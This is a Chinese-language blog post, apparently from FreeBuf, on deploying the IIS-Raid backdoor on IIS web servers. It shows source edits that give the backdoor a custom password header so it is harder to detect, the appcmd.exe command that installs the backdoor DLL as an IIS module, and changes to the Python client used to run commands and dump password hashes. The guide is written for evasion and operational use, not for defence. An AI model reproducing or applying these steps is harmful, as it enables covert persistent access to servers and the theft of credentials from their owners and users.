##  0x00 简介

**之前刷TW的时候在墙外看到老外分享的这款使用IIS的本地模块构建IIS后门，功能可以自定义命令执行，dumhash等。感觉不错。于是下了下来试了下，测试有一点小瑕疵，随即修改了下，原版项目地址(<https://github.com/0x09AL/IIS-Raid>)。**

##  0x01 安装和部署

###  自定义密码字段

在使用之前你得修改默认密码，已放置别人蹭你后门。代码在/module/Functions.h中定义，如下：

    
    
    // Communication Header for the Response.#define COM_HEADER "X-Chrome-Variations"#define PASS_FILE "C:\\Windows\\Temp\\creds.db"#define PASSWORD "SIMPLEPASS"

SIMPLEPASS
就是自定义的密码值，连接后门的时候在HttpHeader中定义，但是这里原版的定义密码的HTTP头字段始终是一个值(X-Password)。这无疑是一个典型的特征了，所以这里得实现自定义这个字段值，在以上定义代码中添加一个常量COM_PASSWD，如下代码：

    
    
    // Communication Header for the Response.#define COM_HEADER "X-Chrome-Variations"#define COM_PASSWD "X-CT-BALA"#define PASS_FILE "C:\\Windows\\Temp\\creds.db"#define PASSWORD "SIMPLEPASS"

然后再更改/module/HttpFactory.cpp39行代码替换掉X-Password值为自定义的常量，如下代码：

    
    
    // Check the header password
        USHORT uPLen = 0;
        LPCSTR lpPassword = pHttpRequest->GetHeader(COM_PASSWD, &uPLen);
        if (lpPassword == NULL) {
            return RQ_NOTIFICATION_CONTINUE;
        }
        else if (strcmp(PASSWORD, lpPassword) != 0) {
            return RQ_NOTIFICATION_CONTINUE;
        }

###  安装

安装比较简单，可以直接在命令行下使用appcmd.exe命令安装，命令如下：

    
    
    C:\Windows\system32\inetsrv\APPCMD.EXE install module /name:Module Name /image:"%windir%\System32\inetsrv\IIS-Backdoor.dll" /add:true

安装成功后入下图所示：  
![](https://image.3001.net/images/20200330/1585574121_5e81f0e996621.png!small)

##  0x02 使用

客户端是py写的一个脚本，但貌似编码有点问题，运行时候回报错，需要去掉py脚本里的banner字符串就可以正常了。如果自定义了密码字段名还需要修改下脚本以便支持自定义HTTP头字段。如下图：

添加个--headpass的命令行参数  
![](https://image.3001.net/images/20200330/1585574135_5e81f0f7f1134.jpg!small)

把自定义的HTT头字段名加入到HttpHeader中  
![](https://image.3001.net/images/20200330/1585574149_5e81f10577f88.jpg!small)

连接成功入后如下图所示：  
![](https://image.3001.net/images/20200330/1585574162_5e81f1123be8c.png!small)

##  0x03 参考

> 原文 <https://www.mdsec.co.uk/2020/02/iis-raid-backdooring-iis-using-native-> modules/>
>
> 演示 <https://youtu.be/jbxEWOXecuU>

***本文作者：Ca3tie1，转载请注明来自FreeBuf.COM**

